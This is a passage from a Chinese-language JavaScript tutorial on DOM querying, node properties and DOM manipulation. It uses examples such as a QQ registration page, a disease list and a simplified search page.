<code>H1</code>是亲兄弟，我们称为兄弟节点。</li></ol><p>注意上面的特性中的粗体，这些不是开玩笑的父子游戏，这是专业术语哈!</p><p>案例：<br><img src="https://style.youkeda.com/img/course/f4/9/2.jpeg" alt="image"></p><p>代码：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;  &lt;head&gt;    &lt;meta charset="UTF-8" /&gt;    &lt;title&gt;优课达&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;header&gt;      &lt;h1&gt;优课达&lt;/h1&gt;    &lt;/header&gt;    &lt;main&gt;      &lt;ul&gt;        &lt;li&gt;          学的比别人好一点        &lt;/li&gt;        &lt;li&gt;          https://www.youkeda.com        &lt;/li&gt;      &lt;/ul&gt;    &lt;/main&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="9-2访问DOCUMENT"><a href="#9-2访问DOCUMENT" class="headerlink" title="9.2访问DOCUMENT"></a>9.2访问DOCUMENT</h3><p>在上节课中我们知道web网页最终会映射为一棵DOM树,<br>DOM树连接网页和Javascript语言，那我们该怎么获取<br>DOM树的根部元素呢?</p><p>很简单，DOCUMENT元素会存在全局变量window下面，<br>我们可以通过如下代码来访问:</p><pre><code>console.log(window.document);</code></pre><p>最终JSConsole中的效果如下：<br><img src="https://style.youkeda.com/img/course/f4/9/3.png" alt="image"><br>从JSConsole我们知道，<code>window.document</code>得到的是一个<code>HTMLDocument</code>对象，这个对象内容有点多，大家不需要全部了解，只需要看几个属性即可，比如document内容key为<code>documentElement</code> :<br><img src="https://style.youkeda.com/img/course/f4/9/4.png" alt="image"><br>还可以了解一下<code>body</code>,<code>head</code>属性,分别对应HTML中的<code>body</code>,<code>head</code>内容。</p><h4 id="Chrome调试工具"><a href="#Chrome调试工具" class="headerlink" title="Chrome调试工具"></a>Chrome调试工具</h4><p>上面的打印结果非常难以阅读，Chrome浏览器为了方便大家阅读,开发一套开发者工具，大家可以在<strong>非工程目录</strong>区域点击右键，点击<strong>检查</strong>开启开发者窗口，如下图所示:<br><img src="https://style.youkeda.com/img/course/f4/9/5.png" alt="image"><br>然后执行下面三个步骤:</p><ol><li>开发者窗口里面切换到<strong>Console</strong>面板</li><li>再次点击代码演示</li><li>可以看到Console里面出现#<strong>document</strong>,这个是Chrome单独处理过的，可读性较强(学习平台中的JSConsole是最原生的对象类型)。</li></ol><p>大家以后可以在此处查看Console,以后课程内容,我会同时截取两处的图片方便大家查看。</p><p>具体操作步骤如下图所示:<br><img src="https://style.youkeda.com/img/course/f4/9/6.png" alt="image"></p><h4 id="选择器查询"><a href="#选择器查询" class="headerlink" title="选择器查询"></a>选择器查询</h4><p>通过上面的代码，我们可以得到了整个网页内容，那如果我们想获取某一个特殊节点应该怎么办呢?我们用前端基础课程的大作业(QQ注册页)这个复杂的HTML代码作为案例。</p><p>代码如下:</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="UTF-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;title&gt;QQ注册&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;nav class="nav"&gt;    &lt;a class="qq"&gt;      &lt;img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/qq.png" /&gt;      &lt;span&gt;QQ&lt;/span&gt;    &lt;/a&gt;    &lt;ul class="right"&gt;      &lt;li class="bright"&gt;        &lt;img          src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/bright.png"          alt="QQ靓号"        /&gt;      &lt;/li&gt;      &lt;li class="language"&gt;        &lt;span&gt;简体中文&lt;/span&gt;        &lt;img          class="arrow"          src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/arrow-down.png"        /&gt;      &lt;/li&gt;      &lt;li class="contact"&gt;意见反馈&lt;/li&gt;    &lt;/ul&gt;  &lt;/nav&gt;  &lt;main class="main"&gt;    &lt;div class="bg"&gt;&lt;/div&gt;    &lt;div class="content"&gt;      &lt;div class="core"&gt;        &lt;h1&gt;欢迎注册QQ&lt;/h1&gt;        &lt;div class="subtitle"&gt;          &lt;h2&gt;每一天，乐在沟通。&lt;/h2&gt;          &lt;a class="free-bright"&gt;免费靓号&lt;/a&gt;        &lt;/div&gt;        &lt;form action=""&gt;          &lt;input type="text" placeholder="昵称" /&gt;          &lt;input class="password" type="password" placeholder="密码" /&gt;          &lt;div class="mobile"&gt;            &lt;select&gt;              &lt;option&gt;+86&lt;/option&gt;              &lt;option&gt;+852&lt;/option&gt;            &lt;/select&gt;            &lt;input type="text" placeholder="手机号码" /&gt;          &lt;/div&gt;          &lt;p class="mobile-tip"&gt;可通过该手机号找回密码&lt;/p&gt;          &lt;button class="submit"&gt;立即注册&lt;/button&gt;          &lt;div class="agreement"&gt;            &lt;input type="checkbox" /&gt;            &lt;label&gt;我已阅读并同意相关服务条款和隐私政策&lt;/label&gt;          &lt;/div&gt;        &lt;/form&gt;      &lt;/div&gt;      &lt;footer&gt;Copyright © 1998-2019Tencent All Rights Reserved&lt;/footer&gt;    &lt;/div&gt;  &lt;/main&gt;&lt;/body&gt;</code></pre><p>我们如何获取到<code>subtitle</code>这个节点呢?</p><pre><code>&lt;div class="subtitle"&gt;  &lt;h2&gt;每一天，乐在沟通。&lt;/h2&gt;  &lt;a class="free-bright"&gt;免费靓号&lt;/a&gt;&lt;/div&gt;</code></pre><p>这就需要用到<strong>选择器查询方法—querySelector()</strong></p><p>这个方法需要传递一个字符串形式的<strong>selectors</strong>作为筛选条件。这需要利用大家已经学过的CSS知识，在此处我们可以使用’.subtitle’作为条件。</p><p>但如果页面中有很多个class为<code>subtitle</code>的节点，可能筛选结果就不太准确了，我们可以加强了筛选条件，为:</p><pre><code>//基础筛选条件'.subtitle';//加强版本，加上父亲筛选， 筛选 main标签下面 -&gt; class为core的节点下面 -&gt; class为subtitle的节点'main .core .subtitle';</code></pre><p>完整的代码如下：</p><pre><code>document.querySelector('main .core .subtitle');</code></pre><p>之前QQ靓号的页面：</p><pre><code>console.log(document.querySelector('main .core .subtitle'));</code></pre><p>最终结果：<br><img src="https://style.youkeda.com/img/course/f4/9/8.png" alt="image"><br>两者结合我们知道筛选到的节点满足我们的要求，并且这个节点是<code>HTMLDivElement</code>类型，我们又认识一种新的DOM对象。</p><h5 id="迭代查询"><a href="#迭代查询" class="headerlink" title="迭代查询"></a>迭代查询</h5><p>当我们得到subtitle元素后,我们还可以利用这个元素，继续筛选器内部元素，比如我们想筛选器内部的a标签,我们可以继续完善代码:</p><pre><code>let subtitle = document.querySelector('main .core .subtitle');console.log(subtitle.querySelector('a'));</code></pre><p>最终可以得到一个HTMLAnchorElement节点，在这里我就不演示了</p><h4 id="选择器全量查询"><a href="#选择器全量查询" class="headerlink" title="选择器全量查询"></a>选择器全量查询</h4><p>在上面的技术中，我们只能查询到第一个满足条件的节点,那该怎么查询所有满足条件的节点呢？</p><p>很简单，换一个方法，改为<strong>querySelectorAll()</strong>, 我们来看个新的案例，查询上面<strong>HTML</strong>中的所有<strong>input</strong>节点。</p><pre><code>document.querySelectorAll('input');</code></pre><p>效果：<br><img src="https://style.youkeda.com/img/course/f4/9/9.png" alt="image"><br>可以发现，我们找到了4个<code>input</code>节点，并且查询返回的是一个<strong>类数组</strong>，我们可以直接通过索引访问。</p><blockquote><p>类数组，顾名思义类似数组形式，(可以通过索引访问的对象我们都可以称之为类数组)，从JSConsole中我们实际得到的是<strong>NodeList</strong>对象。</p></blockquote><h4 id="其他筛选方法"><a href="#其他筛选方法" class="headerlink" title="其他筛选方法"></a>其他筛选方法</h4><p><code>querySelector</code>和<code>querySelectorAll</code>是最新提出的方法，在这两个方法之前，有一套最原生的DOM查询函数,我们简单介绍下:</p><p><strong>getElementByld()</strong>:根据<strong>id</strong>查询某个节点</p><p><strong>getElementsByClassName()</strong>:根据<strong>class</strong>查询多个节点</p><p><strong>getElementsByTagName()</strong>:根据<strong>标签名</strong>查询多个节点</p><p>那querySelector(AII)和getElementXXX有什么具体区别呢?</p><p>最主要的区别在于—<strong>动态性</strong>。</p><blockquote><p>querySelector查询出来的元素是拷贝的原始数据，不会再随着页面DOM节点的改变而变化</p></blockquote><blockquote><p>get系列方法查询出来的元素就是原始数据，所以会随着页面的DOM节点的改变而变化</p></blockquote><p>这部分不要求掌握!大家只需要记住在以后的场景中，大多数都是用<code>querySelector(A11)</code>即可。</p><p>案例：<br><img src="https://style.youkeda.com/img/course/f4/9/11.png" alt="image"></p><pre><code>console.log(document.querySelector('li.bright img'));</code></pre><p>案例2：<br>请利用所学的知识第二个Option DOM节点，如下代码<br><code>&lt;option&gt;+852&lt;/option&gt;</code></p><p><strong>提示：</strong></p><p>1.可以使用CSS伪类选择器或者全部查询再取第二个节点<br>2.注意查看筛选到的节点的innerHTML属性是否为+852</p><pre><code>console.log(document.querySelector('select option:nth-child(2)'));</code></pre><p>或者</p><pre><code>let a =document.querySelectorAll('option');console.log(a[1]);</code></pre><h3 id="9-3DOM属性"><a href="#9-3DOM属性" class="headerlink" title="9.3DOM属性"></a>9.3DOM属性</h3><p>本节课我们学习DOM内部细节，学习他的重要属性，在学之前，我们先统计下上个小节我们遇到的DOM种类。</p><pre><code>&lt;!-- HTMLDocument 根文档 --&gt;&lt;html&gt;  ……&lt;/html&gt;&lt;!-- HTMLDivElement DIV类型 --&gt;&lt;div class="subtitle"&gt;  ……&lt;/div&gt;&lt;!-- HTMLAnchorElement 超链接类型 --&gt;&lt;a class="free-bright"&gt;免费靓号&lt;/a&gt;&lt;!-- HTMLInputElement Input类型 --&gt;&lt;input class="password" type="pasworkd" placeholder="请输入密码" /&gt;</code></pre><p>我们发现基本每一种HTML标签都有-种DOM类型对应,<br>当然还有非常多的类型，大家可以打开MDN网站<br><a href="https://developer.moilla.org/zh-CN/docs/Web/API，在页面中搜索`Element`。" target="_blank" rel="noopener">https://developer.moilla.org/zh-CN/docs/Web/API，在页面中搜索`Element`。</a></p><p>这些类型不要求牢记，大家稍微了解一下即可。 我们马上来<br>重点学习下他们的共同属性。</p><h4 id="DOM属性"><a href="#DOM属性" class="headerlink" title="DOM属性"></a>DOM属性</h4><p>在上面我们看到很多DOM种类，但可以归纳为几个类别:</p><ol><li>元素节点.</li><li>特性节点</li><li>文本节点<br>4 …..其他类别不重要，忽略</li></ol><p>那这三种节点分别对应什么HTML代码呢?我们来看个案例</p><p>html代码如下：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="UTF-8" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id="test"&gt;优课达&lt;/div&gt;  &lt;script src="./index.js"&gt;&lt;/script&gt;&lt;/body&gt;</code></pre><p>JS代码如下：</p><pre><code>let divDom = document.querySelector('div#test');console.log(divDom.nodeType, divDom.nodeName, divDom.nodeValue);// 获取DIV节点的第一个儿子节点，代表 '优课达' 这个字符串let txtDom = divDom.firstChild;console.log(txtDom.nodeType, txtDom.nodeName, txtDom.nodeValue);// 获取DIV节点的id属性let attDom = divDom.attributes.id;console.log(attDom.nodeType, attDom.nodeName, attDom.nodeValue);</code></pre><table><thead><tr><th>节点</th><th>nodeType</th><th>nodeName</th><th>nodeValue</th><th>类型</th></tr></thead><tbody><tr><td>DivDom</td><td>1</td><td>DIV</td><td>null</td><td>元素节点</td></tr><tr><td>txtDom</td><td>3</td><td>#text</td><td>优课达</td><td>文本节点</td></tr><tr><td>attDom</td><td>2</td><td>id</td><td>test</td><td>特性节点</td></tr></tbody></table><p>我们总结下特性如下:</p><ol><li>整个HTML中，无论是标签，标签属性,还是纯文本字符串都是<code>Element</code>，不同的地方在于<code>nodeType</code>分别为<code>1，2，3</code></li><li>HTML标签都是<strong>元素节点</strong>，可以用<code>nodeName</code>获取标签名称</li><li>纯文本都是<strong>文本节点</strong>，可以用<code>nodeValue</code>获取文本内容</li><li>标签的每个属性都是<strong>特性节点</strong>，可以用<code>nodeName</code>取得属性Key,用<code>nodeValue</code>取得属性Value</li><li><code>attributes</code>可以获取元素节点的所有属性，得到的结果是一个字典，通过属性Key获取对应的特性节点。</li></ol><h4 id="DOM内容"><a href="#DOM内容" class="headerlink" title="DOM内容"></a>DOM内容</h4><p>修改如上代码，如下：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="UTF-8" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id="test"&gt;    优课达    &lt;p&gt;youkeda&lt;/p&gt;    &lt;p&gt;学的比别人好一点&lt;/p&gt;  &lt;/div&gt;  &lt;script src="./index.js"&gt;&lt;/script&gt;&lt;/body&gt;</code></pre><pre><code>let divDom = document.querySelector('div#test');console.log(divDom.outerHTML, divDom.innerHTML, divDom.innerText);</code></pre><p>结果为：</p><table><thead><tr><th>属性</th><th>值</th><th>总结</th></tr></thead><tbody><tr><td>outerHTML</td><td><code>&lt;div id="test"&gt;优课达&lt;p&gt;youkeda&lt;/p&gt;&lt;p&gt;学的比别人好一点&lt;/p&gt;&lt;/div&gt;</code></td><td>整个DOM的HTML代码</td></tr><tr><td>innerHTML</td><td><code>优课达&lt;p&gt;youkeda&lt;/p&gt;&lt;p&gt;学的比别人好一点&lt;/p&gt;</code></td><td>DOM内部HTML代码</td></tr><tr><td>innerText</td><td><code>优课达</code></td><td>DOM内部纯文本内容</td></tr></tbody></table><p>在实际情况下，大家根据需要利用不同的属性获取内容。</p><h4 id="DOM亲属"><a href="#DOM亲属" class="headerlink" title="DOM亲属"></a>DOM亲属</h4><p>在上面我们知道可以利用firstChild属性获取到元素的第一个儿子节点。那还能获取哪些其他亲属呢?</p><p>我们来看一个案例:</p><p>HTML依然用上面的代码，Javascript 代码如下:</p><pre><code>let divDom = document.querySelector('div#test');console.log(divDom.firstChild, divDom.lastChild);console.log('-----');console.log(divDom.childNodes);console.log('-----');console.log(divDom.parentNode);</code></pre><p>结果：<br><img src="https://style.youkeda.com/img/course/f4/9/14.png" alt="image"></p><table><thead><tr><th>属性</th><th>值</th><th>总结</th></tr></thead><tbody><tr><td>firstChild</td><td><code>优课达</code></td><td>指定节点的第一个子节点</td></tr><tr><td>lastChild</td><td><code>&lt;p&gt;学的比别人好一点&lt;/p&gt;</code></td><td>指定节点的最后一个子节点</td></tr><tr><td>childNodes</td><td><code>优课达&lt;p&gt;youkeda&lt;/p&gt;&lt;p&gt;学的比别人好一点&lt;/p&gt;</code></td><td>指定节点的子节点的集合</td></tr><tr><td>parentNode</td><td><code>&lt;body&gt;&lt;div id="test"&gt;优课达&lt;p&gt;youkeda&lt;/p&gt;&lt;p&gt;学的比别人好一点&lt;/p&gt;&lt;/div&gt;&lt;script src="./index.js"&gt;&lt;/script&gt;&lt;/body&gt;</code></td><td>指定节点在DOM树中的父节点</td></tr></tbody></table><h4 id="DOM样式"><a href="#DOM样式" class="headerlink" title="DOM样式"></a>DOM样式</h4><p>通过DOM，我们同样可以访问到其CSS特性，我们来下面<br>案例:</p><p>HTML：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="UTF-8" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;h1 class="test youkeda" style="color: #FF3300; font-size: 24px;"&gt;优课达&lt;/h1&gt;  &lt;script src="./index.js"&gt;&lt;/script&gt;&lt;/body&gt;</code></pre><p>JS</p><pre><code>const h1Dom = document.querySelector('h1');console.log(h1Dom.classList);console.log(h1Dom.style);console.log(h1Dom.style.color);</code></pre><p><img src="https://style.youkeda.com/img/course/f4/9/15.png" alt="image"></p><table><thead><tr><th>属性</th><th>类型</th><th>值</th><th>总结</th></tr></thead><tbody><tr><td>classList</td><td>DOMTokenList类数组</td><td>[‘test’,’youkeda’]</td><td>classList数组方式存储所有的class名称</td></tr><tr><td>style</td><td>CSSStyleDeclaration</td><td>clolr属性为rgb(255,51,0)</td><td>对象或字典的方法存储CSSStyle</td></tr></tbody></table><p>当然这些内容都是可以修改的，我们在下一节会具体讲到。</p><h4 id="DOM数据属性"><a href="#DOM数据属性" class="headerlink" title="DOM数据属性"></a>DOM数据属性</h4><p>网页设计的初衷是数据和特定的HTML标签相关联。而我们肉眼能看到的数据只是HTML标签内部纯文本(innerText)部分,</p><p>数据肯定不止肉眼所见那么少，那我们该怎么利用HTML存储呢?</p><p>HTML提供一种数据属性的标准，利用<code>data-*</code>允许我们在标准内于HTML元素中存储额外的信息。例如下代码: .</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="UTF-8" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;article data-parts="3" data-words="1314" data-category="python"&gt;    ...  &lt;/article&gt;  &lt;script src="./index.js"&gt;&lt;/script&gt;&lt;/body&gt;</code></pre><p>如上面的代码，学习过语义化标签,我们知道article<br>一般用于放置文章区域。</p><p>对文章而言，除了文章内容，我们还有其他额外数据，例如:<br><strong>段落，字数,分类</strong>，etc..</p><p>那这些额外数据我们就可以利用<code>data-*</code>来存储，如上面的代码:</p><pre><code>&lt;article data-parts="3" data-words="1314" data-category="python"&gt;&lt;/article&gt;</code></pre><p>注意，数据属性很重要，在前端中广泛应用，大家有兴趣可以用chrome开发者工具去试试看看一下其他网站的代码。</p><p>那我们该怎么通过JS来获取呢?按上面的推理，肯定也存在DOM的某个属性中，代码如下:</p><pre><code>const article = document.querySelector('article');console.log(article.dataset);</code></pre><p><img src="https://style.youkeda.com/img/course/f4/9/16.png" alt="image"><br>从结果可以看出，<code>dataset</code>是个Map对象，它是<code>data-*</code>这个<code>*</code>的<strong>Key-Value</strong>集合。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本章内容比较多，但都比较简单、容易理解。大家也不需要死记硬背，说实话到现在为止我也经常忘记。教给大家一个方法，记住大概意思，比如dataset,只需要记住<code>data</code>然后在DOM打印结果属性中去找寻。</p><p>案例：</p><p>请利用所学的属性获取的知识，获取QQ注册页左上角Logo的图片地址,并打印出来结果为:</p><pre><code>'https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/qq.png';</code></pre><pre><code>const imgDom = document.querySelector('img');console.log(imgDom.attributes.src.value);或者const img = document.querySelector('img');console.log(img.src);</code></pre><p>案例：</p><p>请利用所学的内容获取的知识，获取本页面的标题( h1内部文本) ,并打印出来结果为:</p><p>‘欢迎注册QQ’</p><pre><code>console.log(document.querySelector('h1').innerText);</code></pre><h3 id="9-4DOM操作-1"><a href="#9-4DOM操作-1" class="headerlink" title="9.4DOM操作(1)"></a>9.4DOM操作(1)</h3><h4 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h4><p>通过前面三节课，我们已经对DOM有了很深入的了解。我相信，给到大家任意一个网页，大家都能使用Javascript完.成任意网页内容提取。</p><p>有了这个能力，以后大家如果想转行当爬虫工程师也是非常轻松的。</p><p>大家是不是又一次感受到，软件行业的相通性，也就是一通百通的道理。</p><p>既然对DOM有了足够的了解，那我们再接再厉，本节课开始学习<strong>操作DOM</strong>,想想就特别激动。</p><p>之前的三节课程可以说是理论知识，本节课我想改变一下形式，利用实战案例带大家了解DOM操作该怎么使用!</p><h4 id="DOM样式修改"><a href="#DOM样式修改" class="headerlink" title="DOM样式修改"></a>DOM样式修改</h4><p>还记得这个案例吧<br><img src="https://style.youkeda.com/img/course/f4/9/18.png" alt="image"><br>在Web基础课程第8章,我们在讲到position: absolute </p><p>先不考虑点击事件，点击事件在后面一个章节会给大家讲到，在这里我们先内置点击代码。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="utf-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./post.css" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;section class="box"&gt;    &lt;img      class="java"      src="https://document.youkeda.com/new-learn-path/Bitmap.png"    /&gt;    &lt;div class="title"&gt;Java&lt;/div&gt;    &lt;div class="select"&gt;&lt;/div&gt;  &lt;/section&gt;  &lt;script src="./post.js"&gt;&lt;/script&gt;&lt;/body&gt;</code></pre><p>代码中<code>&lt;div class="select"&gt;&lt;/div&gt;</code>也即是那个圆圈选择框。</p><p>我们可以试想下，有什么办法能实现上面的效果呢?</p><blockquote><p>我们是否可以在点击的时候，向<code>select</code>插入一个<code>img</code>节点,渲染选中的打钩图片。然后再次点击的时候清除<code>select</code>内部节点</p></blockquote><p>当然方案不止这一个，大家可以扩散思维。如果按照这个目标，我们需要哪些技术?</p><ol><li>如何使用Javascript 创建节点? (在这里创建 img节点)</li><li>如何设置节点的样式、属性? ( img节点设置src 属性)</li><li>如何在已存在节点内部添加子节点? ( img节点需要添加到<br>select中)</li><li>如何清空节点内部子节点? (再次 点击时清空select 的子节点)</li></ol><p>根据这个思路，我们来看看Javascript代码,如下:</p><pre><code>// 保存当前是否选中的状态let isSelected = false;// 获取整个元素的节点const box = document.querySelector('.box');// 获取select框节点const select = document.querySelector('.select');// 给整个元素添加点击事件【大家可以先忽略这部分】box.addEventListener('click', function () {  // 点击以后触发这个函数  // 修改当前选中状态，取反即可  isSelected = !isSelected;  // 如果当前是选中状态、则添加img到select中  if (isSelected) {    // 创建一个img标签节点    const img = document.createElement('img');    // 设置img的src属性和样式，让其撑满select框    img.src = 'https://style.youkeda.com/img/sandwich/check.png';    img.setAttribute('style', 'width: 100%; height: 100%;');    // 将这个节点添加到select框中    select.appendChild(img);  } else {    // 如果不是选择状态，则清空内部子元素    select.innerHTML = '';  }});</code></pre><h5 id="1-创建标签节点"><a href="#1-创建标签节点" class="headerlink" title="1.创建标签节点"></a>1.创建标签节点</h5><p><strong>document.createElement(tagName)</strong></p><blockquote><p>此方法用于创建一个由标签名称tagName指定的HTML<br>元素，也就是上节课提到的<strong>元素(标签)节点</strong>。</p></blockquote><p>如果想创建一个<code>div</code>标签,我们可以使用:</p><pre><code>const div = document.createElement('div');</code></pre><p>如果想继续在这个div标签内部，添加纯文本内容，可以继续使用创建文本方法document.createTextNode(),代码如下: </p><pre><code>const div = document.createElement('div');const txt = document.createTextNode('优课达-学的比别人好一点');</code></pre><p>我们继续把txt添加到div中，把div添加到body中，代<br>码如下:</p><pre><code>const div = document.createElement('div');const txt = document.createTextNode('优课达-学的比别人好一点');div.appendChild(txt);document.body.appendChild(div);</code></pre><h5 id="2-添加新节点"><a href="#2-添加新节点" class="headerlink" title="2.添加新节点"></a>2.添加新节点</h5><p><strong>appendChild(newNode)</strong></p><p>在上面的案例中，我们多次用到appendChild(),此方法可以往该节点中插入儿子节点。</p><p>上面案例比较多,我就不举例了，我再给大家介绍一些和此方法类似的API。</p><p><strong>inserBefore(newNode，referenceNode)</strong></p><p>此方法和<code>appendChild()</code>刚好相反，<code>appendChild</code>是在<strong>所有儿子节点之后添加</strong>，<code>inserBefore</code>是在<strong>某个目标儿子节点之前添加</strong>。</p><p><code>insertBefore(newNode,referenceNode)</code>,需要两个参数,<code>newNode</code>表示新节点，<code>referenceNode</code>表示目标节点，也就是新节点插入到目标节点之前。</p><p>我们来看一个案例:</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="utf-8" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;ul class="root"&gt;    &lt;li class="sars"&gt;SARS&lt;/li&gt;  &lt;/ul&gt;  &lt;script src="./index.js"&gt;&lt;/script&gt;&lt;/body&gt;</code></pre><p>在案例中，我们有一个列表，里面陈列着疾病SARS。后来我们发现H1N1，因为没有SARS严重，我们将其放在SARS后。</p><p>2020年发生新型冠状病毒，比SARA严重，需要插入到其<br>前面，最终的顺序为</p><pre><code>&lt;ul class="root"&gt;  &lt;li&gt;新型冠状病毒&lt;/li&gt;  &lt;li&gt;SARS&lt;/li&gt;  &lt;li&gt;H1N1&lt;/li&gt;&lt;/ul&gt;</code></pre><p>那如何用JS来完成这个动态逻辑呢?我们来看看代码:</p><pre><code>const root = document.querySelector('ul.root');const sars = document.querySelector('li.sars');// 创建 H1N1const H1N1 = document.createElement('li');const H1N1Txt = document.createTextNode('H1N1');H1N1.appendChild(H1N1Txt);root.appendChild(H1N1);// 创建 新型冠状病毒const nCoV = document.createElement('li');const nCoVTxt = document.createTextNode('新型冠状病毒');nCoV.appendChild(nCoVTxt);root.insertBefore(nCoV, sars);</code></pre><p>最终的效果和我们想象的一样。但有点瑕疵，上面代码中重复代码太多，本次是添加两个疾病节点，如果以后添加100个疾病节点，那该怎么办呢?</p><p>对，我们既然学习过函数，那我们此处就应该用，上这个技巧，我们修改下代码如下:</p><pre><code>function createDisease(txt) {  const dom = document.createElement('li');  const domTxt = document.createTextNode(txt);  dom.appendChild(domTxt);  return dom;}const root = document.querySelector('ul.root');const sars = document.querySelector('li.sars');// 创建 H1N1const H1N1 = createDisease('H1N1');root.appendChild(H1N1);// 创建 新型冠状病毒const nCoV = createDisease('新型冠状病毒');root.insertBefore(nCoV, sars);</code></pre><h5 id="3-设置样式、属性"><a href="#3-设置样式、属性" class="headerlink" title="3.设置样式、属性"></a>3.设置样式、属性</h5><p>在上面，我们通过如下代码设置CSS样式，这个和直接在HTML代码中写style语法一样。</p><pre><code>img.setAttribute('style', 'width: 100%; height: 100%;');</code></pre><p>在上一节课我们知道dom.style是一个Map对象，因此如<br>果我们不想全量替换样式，我们还可以单独设置某些属性，<br>如下代码:</p><pre><code>dom.style.color = 'xxxx';</code></pre><p><strong>setAttribute()</strong>不仅仅可以设置<code>style</code>之外，所有HTML属性都能用他设置，比如<code>id</code>, <code>src</code> ，<code>type</code> ，<code>disabled</code> , etc…</p><p><strong>classList</strong></p><p>再教给大家一个小技巧，试想一下如果我们需要给img设置太多的样式，这样写起来是不是太麻烦了?那我们有什么简便方法呢?</p><p>在上一节，我们已经知道<code>classList</code>能获取到DOM上所有的类,那我们是否可以把样式写成CSS,然后在此处只用添加或删除class呢?</p><p>当然可以! !</p><p><code>classList</code>给我们提供了基础操作的增删改查方法，很容易<br>理解，大家可以查看下<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/classList" target="_blank" rel="noopener">MDN</a>文档:</p><h5 id="4-innerHTML"><a href="#4-innerHTML" class="headerlink" title="4.innerHTML"></a>4.innerHTML</h5><p>在案例中，我们使用<code>innerHTML=''</code>清空<code>select</code>节点所有的后代内容。</p><p>大家肯定在想那我们是不是可以利用<code>innerHTML</code>，给某个元素添加内容呢?</p><p>当然可以的，我们继续使用疾病的案例:在上面的JS代码中，我们使用<code>appendChild</code>添加<code>textNode</code>节点，我们改变一下写法，代码如下:</p><pre><code>function createDisease(txt) {  const dom = document.createElement('li');  // 我们可以直接用innerHTML设置其纯文本  dom.innerHTML = txt;  return dom;}</code></pre><p>效果和之前的一致</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>本节课虽然只有一一个案例，但是涉及到的知识点还是比较多的,没事,我们后面还有很多案例可以让我们继续巩固这部分知识。</p><p>在上面的案例中，我们发现为了实现某个效果，其实我们有多种方法。这就是前端的特性，我们没有唯一的标准答案，只有较好的方法技巧和规则。</p><h3 id="9-5DOM操作-二"><a href="#9-5DOM操作-二" class="headerlink" title="9.5DOM操作(二)"></a>9.5DOM操作(二)</h3><h4 id="案例介绍"><a href="#案例介绍" class="headerlink" title="案例介绍"></a>案例介绍</h4><p>我们在使用手机浏览器中的百度时候，大家肯定发现过如下两个图片状态:<br><img src="https://style.youkeda.com/img/course/f4/9/20.png" alt="image"><br>左侧图片是输入文字之前，右侧图片是输入<strong>肺炎</strong>之后</p><p>我们本节课就来模拟一个简化版的百度搜索</p><p>我们分解下页面开发步骤:</p><ol><li>首先，我们在不考虑鼠标交互的情况下，完成静态HTML页面</li><li>监听搜索框Input输入事件(这部分代码内置，下一 章我们马上会讲到)</li><li>当输入内容是肺炎时，显示模糊搜索结果</li><li>当输入内容不是肺炎时，显示登录查看历史</li></ol><h4 id="开发静态HTML页面"><a href="#开发静态HTML页面" class="headerlink" title="开发静态HTML页面"></a>开发静态HTML页面</h4><pre><code>&lt;body&gt;  &lt;div&gt;    &lt;nav&gt;      &lt;!-- 头部搜索框区域 --&gt;    &lt;/nav&gt;    &lt;main&gt;      &lt;!-- 输入非'肺炎'情况 --&gt;      &lt;section class="login"&gt;        登录查看历史      &lt;/section&gt;      &lt;!-- 输入'肺炎'情况 --&gt;      &lt;ul class="search-result"&gt;        &lt;li&gt;          &lt;i class="search"&gt;&lt;/i&gt;          &lt;p&gt;&lt;em&gt;肺炎&lt;/em&gt;疫情实时动态&lt;/p&gt;          &lt;i class="edit"&gt;&lt;/i&gt;        &lt;/li&gt;        ……      &lt;/ul&gt;    &lt;/main&gt;  &lt;/div&gt;&lt;/body&gt;</code></pre><p>代码主要分为3块区域,<strong>搜索框，登录查看历史，肺炎相关列表</strong>，当然最后的两个区域不会共存。</p><h4 id="监听Input输入事件，处理区域显示隐藏"><a href="#监听Input输入事件，处理区域显示隐藏" class="headerlink" title="监听Input输入事件，处理区域显示隐藏"></a>监听Input输入事件，处理区域显示隐藏</h4><p>监听Input输入事件，我们暂时内置代码如下:</p><pre><code>const input = document.querySelector('input');// 监听键盘事件input.addEventListener('keyup', function() {  // this 是DOM节点，this.value可以获取input内输入的值  console.log(this.value);});</code></pre><p>大家在Input输入框里面输入内容，内容会实时在<br>JSConsole打出，这就说明我们已经完成输入事件的监听。</p><h4 id="监听输入肺炎时，显示肺炎查询结果"><a href="#监听输入肺炎时，显示肺炎查询结果" class="headerlink" 